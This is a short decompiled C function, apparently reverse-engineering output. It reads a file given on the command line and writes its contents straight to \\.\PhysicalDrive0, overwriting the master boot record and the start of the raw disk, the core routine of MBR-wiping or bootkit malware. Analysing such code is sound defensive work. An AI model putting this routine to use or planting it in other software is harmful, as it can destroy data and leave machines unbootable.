int __cdecl main(int argc, const char **argv, const char **envp)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-20h] BYREF
  LPVOID lpBuffer; // [esp+4h] [ebp-1Ch]
  DWORD nNumberOfBytesToRead; // [esp+8h] [ebp-18h]
  HANDLE hFile; // [esp+Ch] [ebp-14h]
  HANDLE hObject; // [esp+10h] [ebp-10h]
  LPCSTR lpFileName; // [esp+14h] [ebp-Ch]
  int *p_argc; // [esp+18h] [ebp-8h]

  p_argc = &argc;
  _main();
  lpFileName = argv[1];
  hObject = CreateFileA(
              lpFileName: "\\\\.\\PhysicalDrive0",
              dwDesiredAccess: 0x10000000u,
              dwShareMode: 3u,
              lpSecurityAttributes: nullptr,
              dwCreationDisposition: 3u,
              dwFlagsAndAttributes: 0,
              hTemplateFile: nullptr);
  if ( hObject != (HANDLE)-1 )
  {
    hFile = CreateFileA(
              lpFileName,
              dwDesiredAccess: 0x80000000,
              dwShareMode: 0,
              lpSecurityAttributes: nullptr,
              dwCreationDisposition: 3u,
              dwFlagsAndAttributes: 0,
              hTemplateFile: nullptr);
    if ( hFile != (HANDLE)-1 )
    {
      nNumberOfBytesToRead = GetFileSize(hFile, lpFileSizeHigh: nullptr);
      if ( nNumberOfBytesToRead != 0 )
      {
        lpBuffer = (LPVOID)operator new[](a1: nNumberOfBytesToRead);
        if ( ReadFile(
               hFile,
               lpBuffer,
               nNumberOfBytesToRead,
               lpNumberOfBytesRead: &NumberOfBytesRead,
               lpOverlapped: nullptr) )
        {
          WriteFile(
            hFile: hObject,
            lpBuffer,
            nNumberOfBytesToWrite: nNumberOfBytesToRead,
            lpNumberOfBytesWritten: &NumberOfBytesRead,
            lpOverlapped: nullptr);
        }
      }
    }
    CloseHandle(hObject: hFile);
  }
  CloseHandle(hObject);
  __getch();
  return 0;
}